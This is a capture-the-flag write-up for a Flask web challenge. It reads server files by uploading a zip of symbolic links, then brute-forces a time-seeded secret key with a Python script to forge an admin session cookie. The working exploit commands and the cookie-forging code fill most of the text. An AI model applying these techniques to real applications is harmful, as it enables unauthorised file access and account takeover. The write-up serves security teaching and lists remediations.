## Skills required: Local File Inclusion, basic enumeration and research

A simple little challenge solved with fsharp. I took some time because I overlooked some stuff, kudos to Kaiziron for spotting it.

## Solution:

Working backwards really shines in this challenge.

The flag is accessible at `/flag` if you are an admin as determined by the session cookie:

```py
@app.route("/flag")
def flag():
    if not session.get("admin"):
        return "Unauthorized!"
    return subprocess.run("./flag", shell=True, stdout=subprocess.PIPE).stdout.decode("utf-8")
```

`session.admin` is always set to `False` upon registration and the application does not touch on it anymore.
This means we have to **forge an admin token**. From [Flask documetntation](https://flask.palletsprojects.com/en/2.2.x/api/#sessions) we know that the `SECRET_KEY` alone determines how the cookie is signed:

```py
SECRET_OFFSET = 0 # REDACTED
a = time.time()
random.seed(round((a + SECRET_OFFSET) * 1000))
os.environ["SECRET_KEY"] = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
```

We need 2 things:
- application start time (as accurate as possible)
- SECRET_OFFSET

Thankfully both can be found in files:
- **/tmp/server.log** for application start time (accurate to the nearest second)
- **/app/config.py** for SECRET_OFFSET (*this is what I overlooked*)

At this point the challenge is basically solved, as we have a glaring **local file inclusion vulnerability with zipped symbolic links**.
- Symbolic links are like shortcuts
- In Linux file system, symbolic links themselves are files and can be compressed in zip:

```
ln -s / root
zip --symlinks evil.zip root
```

After uploading the evilzip, I have full access to server files as allowed by my user:

![image](https://user-images.githubusercontent.com/114584910/213147450-725a65f7-b63c-4c4f-8ca7-9d2a9fb98248.png)

![image](https://user-images.githubusercontent.com/114584910/213147782-be855388-3939-46b1-bbd7-e80aa9538f9b.png)

It is important to stress that there's nothing wrong with any file paths ー the *folder* itself is malicious.

Now we only have 1000 possibitilies for the secret (1000 milliseconds), which took less than 0.5s to bruteforce, thanks to [this script from aescalana](https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe).

```py
import random, base64
from tqdm import tqdm0.25s
import multiprocessing as mp

from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

ck = 'eyJhZG1pbiI6bnVsbCwidWlkIjoiUk4ifQ.Y8fN_A.Nrz4bqV2ghYoLs2MWyfmCn9i3ok'
start  =  1673997221 # https://www.epochconverter.com/
offset = -67198624

def trial(x):
  random.seed((start+offset)*1000+x)
  key = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
  try:
    decodedDict = decodeFlaskCookie(key, ck)
    print(key)
    print(encodeFlaskCookie(key, {"admin":True,"uid":"RN"}))
  except:
    pass

for i in tqdm(range(1000)):
	trial(i)
```

**FLAG:** `idek{s1mpl3_expl01t_s3rver}`

## Trivia:
- The symlink in zip technique allows for arbitrary read; a related technique called [zip slip](https://security.snyk.io/research/zip-slip-vulnerability) allows for arbitrary write.
  - During the challenge, it came across our minds, but we decided it wouldn't work because the application does not parse the zip by itself.
- The remediation is simple: [don't allow zip file uploads](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#file-content-validation)
